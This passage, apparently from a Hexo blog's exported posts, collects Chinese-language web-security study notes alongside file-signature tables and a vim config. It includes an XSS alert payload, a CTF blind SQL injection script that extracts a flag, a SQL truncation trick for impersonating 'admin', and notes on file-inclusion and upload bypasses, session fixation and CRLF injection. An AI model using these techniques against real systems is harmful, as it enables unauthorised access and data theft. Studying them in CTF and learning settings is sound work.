        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec_btn<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>document.write(jsEncode(<span class="token punctuation">'</span>&lt;image src<span class="token punctuation">=</span># onerror<span class="token punctuation">=</span>alert(123) / <span class="token punctuation">></span><span class="token punctuation">'</span>))<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>1,2,4 会弹框<br>3 不会</p>
<h1 id="另外有一些标签不解析html，他们是"><a href="#另外有一些标签不解析html，他们是" class="headerlink" title="另外有一些标签不解析html，他们是"></a>另外有一些标签不解析html，他们是</h1><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noscript</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noscript</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noframes</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noframes</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plaintext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plaintext</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> 周三 </tag>
            
            <tag> decode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NJCTF2017-login]]></title>
      <url>/2017/03/25/NJCTF2017-login/</url>
      <content type="html"><![CDATA[<ol>
<li>当数据超过建表时的规定的数据大小，mysql将超过的部分截断 </li>
<li>当select时where查询字句中的数据如果最后以空格结尾，mysql默认将空格去除查询 </li>
</ol>
<p>So, 注册一个 <code>admin             x</code>的用户</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[binary in Mysql]]></title>
      <url>/2017/03/25/binary-in-Mysql/</url>
      <content type="html"><![CDATA[<p>在看NJCTF2017的writeup的时候看到了</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> quote

url <span class="token operator">=</span> "http:<span class="token comment" spellcheck="true">//218.2.197.235:23733/index.php?key="</span>
payload <span class="token operator">=</span> "\xc0'<span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">like</span><span class="token punctuation">(</span>0x<span class="token operator">%</span>s<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#"</span>
<span class="token number">def</span> <span class="token keyword">check</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>:
    u <span class="token operator">=</span> url <span class="token operator">+</span> quote<span class="token punctuation">(</span>payload <span class="token operator">%</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ret <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>content
    <span class="token keyword">return</span> <span class="token string">'002265'</span> <span class="token operator">in</span> ret


ans <span class="token operator">=</span> <span class="token string">""</span>

s <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;&lt;=>?@[\\]^`{|}~\'"_%'</span>


<span class="token keyword">if</span> __name__ <span class="token operator">=</span><span class="token operator">=</span> <span class="token string">"__main__"</span>:
    <span class="token keyword">while</span> <span class="token boolean">True</span>:
        <span class="token keyword">print</span> ans
        <span class="token keyword">for</span> i <span class="token operator">in</span> s:
            <span class="token keyword">if</span> <span class="token keyword">check</span><span class="token punctuation">(</span>ans <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'%'</span><span class="token punctuation">)</span>:
                ans <span class="token operator">+</span><span class="token operator">=</span> i
                <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中， 这里<code>payload = &quot;\xc0&#39;||(select(binary(flag))from(flag))like(0x%s)#&quot;</code> 有一个<code>binary(flag)</code>, 查了下才知道原来<code>mysql</code>默认在查询的时候是不区分数据大小写的，需要加一个binary</p>
]]></content>
      
        
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FI]]></title>
      <url>/2017/03/25/FI/</url>
      <content type="html"><![CDATA[<p>FI (文件包含)</p>
<ul>
<li>include(), include_once()</li>
<li>require(), require_once()<br>  这4个函数包含新的文件时候，<em>无论文件是什么类型，都会作为PHP代码执行</em></li>
</ul>
<p>LFI (本地文件包含)</p>
<p>RFI (远程文件包含)</p>
<p>默认情况下<br><code>allow_url_fopen</code> [+]<br><code>allow_url_include</code> [-] =&gt; 好像是<code>RFI</code>必须的<br>需要搞清楚什么时候需要开启什么</p>
<ol>
<li><code>data://</code> <code>allow_url_include</code> [+]</li>
</ol>
<p><del><code>php://input</code> <code>allow_url_include</code> [+]</del></p>
<ol>
<li><code>php:input</code> 并不需要<code>allow_url_include</code>,甚至不需要<code>allow_url_fopen</code>,今天下午刚刚测试</li>
</ol>
<p>可以试图包含访问日志</p>
<p><code>open_basedir</code> 开启后会严格控制可访问的文件的路径</p>
]]></content>
      
        
        <tags>
            
            <tag> RFI </tag>
            
            <tag> LFI </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[权限]]></title>
      <url>/2017/03/25/%E6%9D%83%E9%99%90/</url>
      <content type="html"><![CDATA[<p>访问控制: What can I do? =&gt; 可能越权<br>认证: Who ma I? =&gt; 可能冒名</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Cookie && Session]]></title>
      <url>/2017/03/25/Cookie-Session/</url>
      <content type="html"><![CDATA[<p>一般的服务器创建新Session后，会让用户的<code>Cookie</code>,来存储一个<code>Session ID</code>,此时<code>Session ID</code>泄露就GG</p>
<ol>
<li><p>通过Referer泄露存储在url中的Session id,让一张图片带出来(就是发了一次GET请求)</p>
</li>
<li><p>Session Fixation攻击</p>
<ul>
<li>用户A得到一个未验证的Session ID，诱骗B去点击，然后获得认证，如果服务器没有在<code>登陆完成后，重写Session ID</code>, 那B就要GG了</li>
</ul>
</li>
<li><p>Session 保持攻击</p>
<ul>
<li>通过刷新页面来保持Session不过期</li>
<li>阔以一段时间强制销毁Session,来预防攻击</li>
</ul>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> Cookie </tag>
            
            <tag> Session </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件上传]]></title>
      <url>/2017/03/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<ol>
<li>截断 &amp;&amp; 解析<ul>
<li>Apache解析<ul>
<li><code>PHP &lt; 5.3</code> 会存在 <code>00截断</code>, 受GPC影响</li>
<li><code>PHP &lt; 5.3</code> 会存在 <code>.\截断</code>, 不受GPC影响</li>
</ul>
</li>
<li>IIS解析<ul>
<li><code>IIS6</code> 会存在 <code>;</code> 截断</li>
<li><code>IIS6</code> 会对 <code>/*.asp/</code> 目录下文件都当做 <code>asp</code> 文件来解析[不管后缀名如何]</li>
<li><code>IIS</code> 中如果<ol>
<li>目录支持写权限</li>
<li>开启了<code>WebDav</code><br>就会支持<code>PUT</code> 方法, 再结合<code>MOVE</code>方法，就能将原来只允许上传文本文件改为脚本文件</li>
</ol>
</li>
</ul>
</li>
<li>PHP CGI 路径解析</li>
</ul>
</li>
</ol>
<ol>
<li></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CRLF注入]]></title>
      <url>/2017/03/25/CRLF%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<ol>
<li>FIRST:<br> CR是’\r’<br> LF是’\n’</li>
<li>SO:<br> 凡是使用<code>CRLF</code>作为分隔符的地方都可能存在这种注入</li>
<li>举个栗子<ul>
<li>HTTP: [Http Response Splitting]<ul>
<li>HTTP 头部是通过<code>\r\n</code>来分隔的,如果服务器没有过滤<code>\r\n</code>,直接把用户的输入放在HTTP头部中,可能就要GG了</li>
<li>比如两次CRLF可以结束http头部，并开始http请求体,从而注入<code>html</code>,而服务器端如果不加过滤的把用户输入作为<code>Set-Cookie</code>的话就可能要GG了</li>
</ul>
</li>
</ul>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi]]></title>
      <url>/2017/03/25/SQLi-1/</url>
      <content type="html"><![CDATA[<ol>
<li><p>一定要注意这个编码问题</p>
</li>
<li><p>SQL Column Truncation<br> <code>sql_mode</code>选项，当<code>sql_mode</code>设置为<code>default</code>, 即没有开启<code>STRICT_ALL_TABLES</code>时候,用户输入超长的值，只会<code>warning</code>,而不<code>error</code>(error会导致插入不成功), 做个时候可能会出现截断问题<br> 比如注册了一个超级长的<code>admin        x</code>, 可能截断后就变成admin了</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> SQLi </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[curl & grep]]></title>
      <url>/2017/03/24/curl-grep/</url>
      <content type="html"><![CDATA[<pre class="line-numbers language-bash"><code class="language-bash">    curl -s <span class="token string">"http://xxx"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"xxx"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> 好久不见 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mathjax-test]]></title>
      <url>/2017/02/21/Mathjax-test/</url>
      <content type="html"><![CDATA[<blockquote>
<p>123</p>
</blockquote>
<p>$$<br>\int_0^1  x^2 {\rm d}x = 3<br>$$</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">const</span> v <span class="token operator">=</span> x <span class="token operator">=</span><span class="token operator">></span> x <span class="token operator">*</span> x<span class="token punctuation">;</span>
<span class="token keyword">var</span> myfun <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">333</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> test </tag>
            
            <tag> latex </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[about URL]]></title>
      <url>/2017/01/29/about-URL/</url>
      <content type="html"><![CDATA[<a id="more"></a>
<ol>
<li><p>escape &amp; encodeURI &amp; encodeURIComponent</p>
<ul>
<li>escape 已经被废弃</li>
<li>要作为URI跳转，则使用encodeURI</li>
<li>要作为参数k-v的value，则使用encodeURIComponent</li>
</ul>
</li>
<li><p>听说  <em>Hacker’s Delight</em> 一本很不错的书，但是，但是。。。 <em>译本</em>  据说翻译的很坑爹啊</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 周末 </tag>
            
            <tag> 好久不记 </tag>
            
            <tag> 寒假 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[vim]]></title>
      <url>/2017/01/08/vim/</url>
      <content type="html"><![CDATA[<p>发现自己好菜，居然没有用过插件。。。</p>
<ol>
<li>w&amp;e or W&amp;E : 前者是以程序变量的方式分割单词, 后者是以空格分割单词<br> w/W 是下一个 单词开头，e/E 是下一个 单词结尾(不是下一个单词 的结尾)</li>
<li>* 和 #:  匹配光标当前所在的单词，移动光标到下一个（或上一个）匹配单词（*是下一个，#是上一个）</li>
<li>句尾出现的<code>^M</code>, 删除的时候要<code>:%s/^M//g</code>, 这个^M…我开始打不出来, 查了下应该是<code>Ctrl-V Ctrl-M</code>…社会社会</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> vim </tag>
            
            <tag> 周日 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PNG & GIF]]></title>
      <url>/2016/11/29/PNG-GIF/</url>
      <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/fengyv/archive/2006/04/30/2423964.html" target="_blank" rel="external">!png</a></p>
<p><a href="http://dev.gameres.com/Program/Visual/Other/GIFDoc.htm" target="_blank" rel="external">!gif</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 常用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件头]]></title>
      <url>/2016/11/29/%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
      <content type="html"><![CDATA[<p>转过来的，这个被转了很多次。已经不知道从哪里来的了</p>
<p>1、从Ultra－edit-32中提取出来的<br>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Postscript (eps.or.ps)，文件头：252150532D41646F6265<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864<br>2、从winhex中取出的文件头列表<br>File Type ExtensionsHeader<br>JPEG jpg;jpeg 0xFFD8FF<br>PNG png 0x89504E470D0A1A0A<br>GIF gif GIF8<br>TIFF tif;tiff 0x49492A00<br>TIFF tif;tiff 0x4D4D002A<br>Bit map bmp BM<br>AOL ART art 0x4A47040E000000<br>AOL ART art 0x4A47030E000000<br>PC Paintbrush pcx 0x0A050108<br>Graphics Metafile wmf 0xD7CDC69A<br>Graphics Metafile wmf 0x01000900<br>Graphics Metafile wmf 0x02000900<br>Enhanced Metafile emf 0x0100000058000000<br>Corel Draw cdr CDR<br>CAD dwg 0x41433130<br>Adobe Photoshop psd 8BPS<br>Rich Text Format rtf rtf<br>XML xml<br>HTML html;htm;PHP;php3;php4;phtml;shtml type<br>Email eml Delivery-date:<br>Outlook Express dbx 0xCFAD12FE<br>Outlookpst!BDN<br>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1<br>MS Access mdb;mda;mde;mdt Standard J<br>WordPerfect wpd 0xFF575043<br>OpenOffice Writer sxw writer<br>OpenOffice Calc sxc calc<br>OpenOffice Math sxm math<br>OpenOffice Impress sxi impress<br>OpenOffice Draw sxd draw<br>Adobe FrameMaker fm &lt;MAKERFILE<br>PostScript eps.or.ps;ps;eps %!PS-Adobe<br>Adobe Acrobat pdf %PDF-1.<br>Quicken qdf 0xAC9EBD8F<br>QuickBooks Backup qbb 0x458600000600<br>Sage sly.or.srt.or.slt;sly;srt;slt0x53520100<br>Sage Backup 1 SAGEBACKUP<br>Lotus WordPro v9 lwp 0x576F726450726F<br>Lotus 123 v9 123 0x00001A00051004<br>Lotus 123 v5 wk4 0x00001A0002100400<br>Lotus 123 v3 wk3 0x00001A0000100400<br>Lotus 123 v1 wk1 0x2000604060<br>Windows Password pwl 0xE3828596<br>ZIP Archive zip;jar 0x504B0304<br>ZIP Archive (outdated) zip 0x504B3030<br>RAR Archive rar Rar!<br>GZ Archive gz;tgz 0x1F8B08<br>BZIP Archive bz2 BZh<br>ARJ Archive arj 0x60EA<br>7-ZIP Archive 7z 7z集’<br>Wave wav WAVE<br>AVI avi AVI<br>Real Audio ram;ra .ra?0<br>Real Media rm .RMF<br>MPEG mpg;mpeg 0x000001BA<br>MPEG mpg;mpeg 0x000001B3<br>Quicktime mov moov<br>Windows Media asf 0x3026B2758E66CF11<br>MIDI mid MThd<br>Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ<br>Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ<br>ELF Executable elf;; 0x7F454C4601010100<br>各种文件类型文件头标志位详细列表<br>FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File”<br>FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File”<br>474946383961, .gif, “GIF 89A”<br>474946383761, .gif, “GIF 87A”<br>424D, .bmp, “Windows Bitmap”<br>4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;<br>.cpl;.x32, “Executable File”<br>504B0304, .zip, “Zip Compressed”<br>3A42617365, .cnt, “”<br>D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile”<br>0100000058000000, .emf, “”<br>03000000C466C456, .evt, “”<br>3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile”<br>1F8B08, .gz, “GZ Compressed File”<br>28546869732066696C65, .hqx, “”<br>0000010000, .ico, “Icon File”<br>4C000000011402, .lnk, “Windows LinkFile”<br>25504446, .pdf, “Adobe PDF File”<br>5245474544495434, .reg, “”<br>7B5C727466,.rtf, “Rich Text Format File”<br>lh, .lzh, “Lz compression file”<br>MThd, .mid, “”<br>0A050108, .pcx, “”<br>25215053, .eps, “Adobe EPS File”<br>2112, .ain, “AIN Archive File”<br>1A02, .arc, “ARC/PKPAK Compressed 1”<br>1A03, .arc, “ARC/PKPAK Compressed 2”<br>1A04, .arc, “ARC/PKPAK Compressed 3”<br>1A08, .arc, “ARC/PKPAK Compressed 4”<br>1A09, .arc, “ARC/PKPAK Compressed 5”<br>60EA, .arj, “ARJ Compressed”<br>41564920, .avi, “Audio Video Interleave(AVI)”<br>425A68, .bz;.bz2, “Bzip Archive”<br>49536328, .cab, “Cabinet File”<br>4C01, .obj, “Compiled Object Module”<br>303730373037, .tar;.cpio, “CPIO ArchiveFile”<br>4352555348, .cru;.crush, “CRUSH ArchiveFile”<br>3ADE68B1, .dcx, “DCX Graphic File”<br>1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile”<br>91334846, .hap, “HAP Archive File”<br>3C68746D6C3E,.htm;.html, “HyperText Markup Language 1”<br>3C48544D4C3E,.htm;.html, “HyperText Markup Language 2”<br>3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3”<br>100, .ico, “ICON File”<br>5F27A889, .jar, “JAR Archive File”<br>2D6C68352D,.lha, “LHA Compressed”<br>20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet”<br>00001A0007800100, .fm3, “Lotus 123 v3 FMTfile”<br>00001A0000100400, .wk3, “Lotus 123 v3Worksheet”<br>20006800200, .fmt, “Lotus 123 v4 FMTfile”<br>00001A0002100400, .wk4, “Lotus 123 v5”<br>5B7665725D, .ami, “Lotus Ami Pro”<br>300000041505052, .adx, “Lotus ApproachADX file”<br>1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template”<br>4D47582069747064, .ds4, “MicrografixDesigner 4”<br>4D534346, .cab, “Microsoft CAB FileFormat”<br>4D546864, .mid, “Midi Audio File”<br>000001B3, .mpg;.mpeg, “MPEG Movie”<br>0902060000001000B9045C00, .xls, “MS Excel v2”<br>0904060000001000F6055C00, .xls, “MS Excel v4”<br>7FFE340A,.doc, “MS Word”<br>1234567890FF, .doc, “MS Word 6.0”<br>31BE000000AB0000, .doc, “MS Word forDOS 6.0”<br>1A00000300001100, .nsf, “NotesDatabase”<br>7E424B00, .psp, “PaintShop Pro Image File”<br>504B0304, .zip, “PKZIP Compressed”<br>89504E470D0A, .png, “PNG Image File”<br>6D646174, .mov, “QuickTime Movie”<br>6D646174, .qt, “Quicktime MovieFile”<br>52617221, .rar, “RAR Archive File”<br>2E7261FD, .ra;.ram, “Real AudioFile”<br>EDABEEDB, .rpm, “RPM Archive File”<br>2E736E64, .au, “SoundMachine AudioFile”<br>53495421, .sit, “Stuffit v1 ArchiveFile”<br>53747566664974, .sit, “Stuffit v5Archive File”<br>1F9D, .z, “TAR Compressed ArchiveFile”<br>49492A, .tif;.tiff, “TIFF (Intel)”<br>4D4D2A,.tif;.tiff, “TIFF (Motorola)”<br>554641, .ufa, “UFA Archive File”<br>57415645666D74, .wav, “Wave Files”<br>D7CDC69A,.wmf, “Windows Meta File”<br>4C000000, .lnk, “Windows Shortcut (LinkFile)”<br>504B3030504B0304, .zip, “WINZIPCompressed”<br>FF575047, .wpg, “WordPerfectGraphics”<br>FF575043, .wp, “WordPerfect v5 orv6”<br>3C3F786D6C,.xml, “XML Document”<br>FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)”<br>3C21454E54495459, .dtd, “XML DTD”<br>5A4F4F20, .zoo, “ZOO Archive File</p>
]]></content>
      
        <categories>
            
            <category> 备忘 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 周二 </tag>
            
            <tag> 常用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[zip文件乱码]]></title>
      <url>/2016/11/26/zip%E6%96%87%E4%BB%B6%E4%B9%B1%E7%A0%81/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[胡乱配了下vim]]></title>
      <url>/2016/11/25/%E8%83%A1%E4%B9%B1%E9%85%8D%E4%BA%86%E4%B8%8Bvim/</url>
      <content type="html"><![CDATA[<pre class="line-numbers language-vim"><code class="language-vim"><span class="token builtin">syntax</span> <span class="token keyword">on</span>
<span class="token keyword">set</span> <span class="token builtin">cindent</span> <span class="token builtin">autoindent</span> <span class="token keyword">number</span> <span class="token keyword">sts</span><span class="token operator">=</span><span class="token number">4</span> <span class="token builtin">sw</span><span class="token operator">=</span><span class="token number">4</span> <span class="token keyword">ts</span><span class="token operator">=</span><span class="token number">4</span> <span class="token builtin">et</span>
<span class="token keyword">set</span> <span class="token builtin">backspace</span><span class="token operator">=</span>indent<span class="token punctuation">,</span><span class="token builtin">eol</span><span class="token punctuation">,</span>start

<span class="token builtin">autocmd</span> FileType <span class="token keyword">python</span> <span class="token keyword">setlocal</span> <span class="token builtin">makeprg</span><span class="token operator">=</span><span class="token keyword">python</span>\ <span class="token operator">%</span>
<span class="token builtin">autocmd</span> FileType <span class="token keyword">c</span> <span class="token keyword">setlocal</span> <span class="token builtin">makeprg</span><span class="token operator">=</span>gcc\ <span class="token operator">-</span><span class="token keyword">o</span>\ <span class="token operator">%</span><span class="token operator">&lt;</span>\ <span class="token operator">%</span>
<span class="token builtin">autocmd</span> FileType cpp <span class="token keyword">setlocal</span> <span class="token builtin">makeprg</span><span class="token operator">=</span>g<span class="token operator">+</span><span class="token operator">+</span>\ <span class="token operator">-</span><span class="token keyword">o</span>\ <span class="token operator">%</span><span class="token operator">&lt;</span>\ <span class="token operator">%</span>
<span class="token builtin">autocmd</span> FileType java <span class="token keyword">setlocal</span> <span class="token builtin">makeprg</span><span class="token operator">=</span>java\ <span class="token operator">%</span>

<span class="token keyword">colorscheme</span> industry

map <span class="token operator">&lt;</span>F2<span class="token operator">></span> <span class="token punctuation">:</span><span class="token keyword">call</span> <span class="token function">SetTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span>
map <span class="token operator">&lt;</span>F5<span class="token operator">></span> <span class="token punctuation">:</span><span class="token keyword">call</span> <span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span>
map <span class="token operator">&lt;</span>F7<span class="token operator">></span> <span class="token punctuation">:</span><span class="token keyword">make</span><span class="token operator">&lt;</span>CR<span class="token operator">></span><span class="token operator">&lt;</span>CR<span class="token operator">></span><span class="token operator">&lt;</span>CR<span class="token operator">></span> <span class="token punctuation">:</span><span class="token keyword">cw</span><span class="token operator">&lt;</span>CR<span class="token operator">></span><span class="token operator">&lt;</span>CR<span class="token operator">></span>


func<span class="token operator">!</span> <span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token keyword">if</span> &amp;<span class="token keyword">filetype</span> <span class="token operator">==</span> <span class="token string">"java"</span>
       exec <span class="token string">"!java %&lt;"</span>
   <span class="token keyword">endif</span>
   <span class="token keyword">if</span> &amp;<span class="token keyword">filetype</span> <span class="token operator">==</span> <span class="token string">"python"</span>
       exec <span class="token string">"!python %"</span>
   <span class="token keyword">endif</span>
   exec <span class="token string">"!./%&lt;"</span>
endfunc

func <span class="token function">SetTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span><span class="token string">'/* **********************************************'</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span><span class="token string">'Auther: haibin'</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span><span class="token string">'Created Time: '</span><span class="token operator">.</span><span class="token function">strftime</span><span class="token punctuation">(</span><span class="token string">'%c'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span><span class="token string">'File Name   : '</span><span class="token operator">.</span><span class="token function">expand</span><span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> <span class="token keyword">l</span> <span class="token operator">=</span> <span class="token keyword">l</span> <span class="token operator">+</span> <span class="token number">1</span> | <span class="token keyword">call</span> <span class="token function">setline</span><span class="token punctuation">(</span><span class="token keyword">l</span><span class="token punctuation">,</span><span class="token string">'*********************************************** */'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> &amp;<span class="token keyword">filetype</span> <span class="token operator">==</span> <span class="token string">"cpp"</span>
